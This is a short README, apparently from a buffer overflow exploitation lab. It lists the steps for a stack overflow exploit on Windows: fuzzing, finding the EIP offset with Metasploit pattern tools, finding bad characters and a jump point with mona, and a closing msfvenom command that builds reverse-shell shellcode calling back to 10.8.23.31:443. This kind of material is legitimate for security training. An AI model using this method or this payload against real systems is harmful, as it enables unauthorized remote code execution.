# BOF
---------
1. Fuzz with 01-fuzz.py
2. Once found the crashing buffer use pattern create to create a pattern:
```bash
/usr/bin/msf-pattern_create -l 2500
```

Copy over the pattern created and run 02-offset.py

3. Use msf pattern offset to find the offset match: 

Copy the value at  EIP
```bash
/usr/bin/msf-pattern_offset -l 500 -q 356B4134
```

```
!mona findmsp -distance 500 
```

```
EIP contains normal pattern offset 1274
```

Add the EIP to the script  03-eip.py and overwrite the EIP with Bs

3. Finding bad  characters:

Set mona config folder:
```
!mona config -set workingfolder c:\mona\
```

Generate badchars using mona:

```
!mona bytearray -cpb "\x00"
```

Copy over the chars to the script and run.

Note down the bad chars, generate a new set of bad chars again:
```
!mona bytearray -cpb "\x00\x16\x2f\xf4\xfd"
```

Once there are no more bad chars, we are good to go.

4. Finding a jump point:

Using mona to find the jump point:
```
!mona compare -f C:\mona\bytearray.bin -a esp
```

Note down the address and set a breakpoint on that address
Execute the script 05-pointer.py
If the pointer address stops at EIP, we are good to go.

5. Generating shellcode:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.23.31 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00\x16\x2f\xf4\xfd"
```

Append the shellcode in the 07-exploit.py script and execute for the reverse shell.